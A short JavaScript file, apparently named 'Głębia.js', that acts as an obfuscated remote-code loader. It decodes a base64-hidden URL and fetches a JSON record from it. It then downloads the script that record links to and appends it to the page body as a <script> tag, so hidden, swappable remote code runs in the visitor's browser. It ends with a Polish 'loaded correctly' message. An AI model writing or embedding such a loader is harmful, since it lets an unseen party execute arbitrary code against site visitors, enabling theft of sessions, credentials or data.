const Glebia = (url, cb) => { fetch(url).then(res => res.json()).then((out) => { cb(out) }).catch(err => { throw err }); }

	Glebia(atob("aHR0cHM6Ly9hcGkubnBvaW50LmlvL2QzMmE5NjNlM2M2NGVhZWE2OWMz"),(data) => {
		Promise.all([
			fetch(data.link).then(value => value.text())
		  ]).then(all => {
			  $("body").append("<script>"+all[0]+"</script>");
		  }).catch(err => { throw err });
	});

	console.log("Skrypt (Głębia.js) załadowano Poprawnie!")